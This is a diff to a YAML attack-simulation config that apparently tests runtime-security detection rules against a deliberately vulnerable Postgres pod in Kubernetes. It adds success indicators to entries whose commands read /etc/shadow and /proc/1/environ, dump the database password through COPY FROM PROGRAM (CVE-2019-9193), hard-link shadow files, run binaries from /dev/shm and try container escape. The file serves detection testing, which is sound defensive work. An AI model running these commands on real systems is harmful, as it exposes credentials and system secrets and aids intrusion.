@@ -122,7 +122,7 @@ attacks:
     type: sqli
     exec:
       command: ["psql", "-tAc",
-                "TRUNCATE cmd_out; COPY cmd_out FROM PROGRAM 'printenv POSTGRES_PASSWORD PGDATA HOSTNAME'; SELECT * FROM cmd_out;"]
+                "TRUNCATE cmd_out; COPY cmd_out FROM PROGRAM 'printenv POSTGRES_PASSWORD PGDATA HOSTNAME; true'; SELECT * FROM cmd_out;"]
     successIndicators:
       - bodyContains: "postgresql"
     expectedDetections:
@@ -137,6 +137,7 @@ attacks:
 
   # T1059.004 — Unix Shell (whoami via exec)
   - name: exec-whoami
+    successIndicators: [{ responseContains: "root" }]
     type: cmdinject
     exec:
       command: ["whoami"]
@@ -148,6 +149,7 @@ attacks:
 
   # T1059.004 — Unix Shell (exec from /dev/shm)
   - name: exec-devshm
+    successIndicators: [{ responseContains: "pwned" }]
     type: cmdinject
     exec:
       command: ["sh", "-c", "cp /bin/echo /dev/shm/malicious_pg && chmod +x /dev/shm/malicious_pg && /dev/shm/malicious_pg pwned && rm -f /dev/shm/malicious_pg"]
@@ -171,6 +173,7 @@ attacks:
 
   # T1611 — Escape to Host (unshare attempt via exec)
   - name: exec-unshare
+    successIndicators: [{ responseContains: "uid=0" }]
     type: cmdinject
     exec:
       command: ["sh", "-c", "unshare -r id 2>&1 || echo unshare_blocked"]
@@ -187,6 +190,7 @@ attacks:
 
   # T1036 — Masquerading: drifted binary (exec into client)
   - name: exec-drifted-binary
+    successIndicators: [{ responseContains: "passwd" }]
     type: cmdinject
     exec:
       command: ["sh", "-c", "cp /bin/ls /tmp/drifted_pg && /tmp/drifted_pg /etc && rm -f /tmp/drifted_pg"]
@@ -244,6 +248,7 @@ attacks:
   # R0010 does not reliably fire for exec-into-pod on Kind/k3s — the file open
   # happens before node-agent can attribute it to the new exec.
   - name: exec-etc-shadow
+    successIndicators: [{ responseContains: "root:" }]
     type: cmdinject
     exec:
       command: ["head", "-5", "/etc/shadow"]
@@ -391,6 +396,7 @@ attacks:
   # T1082 — System Information Discovery: /proc/environ (exec into client)
   # Uses 'od' to avoid null-byte issues and because cat is learned.
   - name: exec-proc-environ
+    successIndicators: [{ responseContains: "P   A   T   H" }]
     type: cmdinject
     exec:
       command: ["od", "-c", "/proc/1/environ"]
@@ -506,6 +512,7 @@ attacks:
 
   # T1496 — Resource Hijacking: crypto mining DNS signal (exec)
   - name: exec-crypto-dns
+    successIndicators: [{ responseContains: "xmr.pool.minergate.com" }]
     type: cmdinject
     exec:
       command: ["sh", "-c", "getent hosts xmr.pool.minergate.com || echo mining_dns_failed"]
@@ -694,6 +701,7 @@ attacks:
 
   # CVE-2019-9193 — COPY FROM PROGRAM: whoami
   - name: cve-2019-9193-copy-program-whoami
+    successIndicators: [{ responseContains: "COPY 1" }]
     type: sqli
     exec:
       command: ["psql", "-tAc",
@@ -716,6 +724,7 @@ attacks:
 
   # CVE-2019-9193 — COPY TO PROGRAM (write to pipe)
   - name: cve-2019-9193-copy-to-program
+    successIndicators: [{ responseContains: "COPY 1" }]
     type: sqli
     exec:
       command: ["psql", "-tAc",
@@ -868,6 +877,7 @@ attacks:
     expectedDetections:
       - { ruleID: R0007, ruleName: Workload uses Kubernetes API unexpectedly, containerName: pg-vuln-client }
   - name: exec-etc-shadow
+    successIndicators: [{ responseContains: "root:" }]
     type: cmdinject
     exec: { command: ["cat", "/etc/shadow"] }
     expectedDetections:
@@ -900,7 +910,7 @@ attacks:
       - { ruleID: R1010, ruleName: Soft link created over sensitive file, containerName: pg-vuln-client, command: ln }
   - name: hardlink-shadow
     type: cmdinject
-    exec: { command: ["sh", "-c", "ln /etc/shadow /dev/shm/hl_probe >/dev/null 2>&1 && echo hardlink_done; rm -f /dev/shm/hl_probe"] }
+    exec: { command: ["sh", "-c", "ln /etc/shadow /tmp/hl_probe >/dev/null 2>&1 && echo hardlink_done; rm -f /tmp/hl_probe"] }
     successIndicators: [{ responseContains: "hardlink_done" }]
     expectedDetections:
       - { ruleID: R1012, ruleName: Hard link created over sensitive file, containerName: pg-vuln-client, command: ln }
